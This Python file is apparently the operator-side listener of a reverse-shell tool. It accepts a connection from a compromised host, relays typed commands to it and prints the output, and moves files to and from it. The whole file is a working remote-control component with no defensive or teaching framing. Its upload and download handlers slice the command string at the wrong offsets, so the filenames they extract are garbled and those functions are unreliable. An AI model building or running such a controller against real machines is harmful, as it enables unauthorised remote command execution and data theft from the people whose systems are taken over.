# server

import socket
import os
import traceback


def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f'Listening on {port}...')

    client, addr = server.accept()
    print(f'Connection established: {addr[0]}:{addr[1]}') 
    
    shell_session(client, addr, server)


def send_file(filename, client):
    chunk_size = 4096

    with open(filename, 'rb') as f:
        while chunk := f.read(chunk_size):
            client.sendall(chunk)
        client.shutdown(socket.SHUT_WR)


def recv_file(filename, client):
    chunk_size =  4096

    with open(filename, 'wb') as f:
        while chunk := client.recv(chunk_size):
            f.write(chunk)


def shell_session(client, addr, server):

    exit_list = ['exit', 'break', 'close', 'bye', 'quit']

    try:
        while True:
            command = input(f'{addr[0]}\033[1m*\033[32mshell\033[m: ').strip()
            if command.lower() in exit_list:
                client.send(command.lower().encode())
                break
            elif command == '':
                pass
            elif command.lower() == 'clean':
                os.system('clear')
            elif command.startswith('!'):
                os.system(command[1:])
            elif command.startswith('upload'):
                filename = command[5:]
                send_file(filename, client)
            elif command.startswith('download'):
                filename = command[7:]
                recv_file(filename, client)
            elif command == 'help':
                print('''
                \n
                commands:
                
                clean - clean

                !<command> - execute local commands: !ls
                command: ls
                
                quit, exit, close... - finish connection.
                \n
                ''')
            else:
               client.send(command.encode())
               output = client.recv(1024).decode()
               if output == 'no output!' or output == 'chdir':
                   pass
               else:
                    print(output)
    except Exception as e :
        print(f'Error: {e}')
        print(traceback.format_exc())
    finally:
        server.close()


def main():
    host = '127.0.0.1'
    port = 8080

    start_server(host, port)


if __name__ == '__main__':
    main()

